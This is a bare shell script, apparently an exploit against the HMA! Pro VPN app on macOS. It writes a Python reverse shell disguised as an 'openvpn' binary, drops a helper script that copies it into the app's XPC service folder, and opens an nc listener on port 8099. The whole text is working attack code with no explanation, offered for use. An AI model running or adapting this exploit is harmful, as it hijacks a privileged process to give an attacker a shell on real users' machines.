address=`ip a s | grep -w inet | awk '{print $2}' | cut -d/ -f1 | sed -n 2p`

echo '#!/usr/bin/python' > openvpn
echo 'import socket,subprocess,os;' >> openvpn
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> openvpn
echo 's.connect(("'$address'",8099));' >> openvpn
echo 'os.dup2(s.fileno(),0);' >> openvpn
echo 'os.dup2(s.fileno(),1);' >> openvpn
echo 'os.dup2(s.fileno(),2);' >> openvpn
echo 'p=subprocess.call(["/bin/sh","-i"]);' >> openvpn

echo 'cp openvpn /Applications/HMA\!\ Pro\ VPN.app/Contents/XPCServices/HMA\!\ Pro\ VPN\ Engine.xpc/Contents/MacOS/' > osx.sh

nc -nvlp 8099
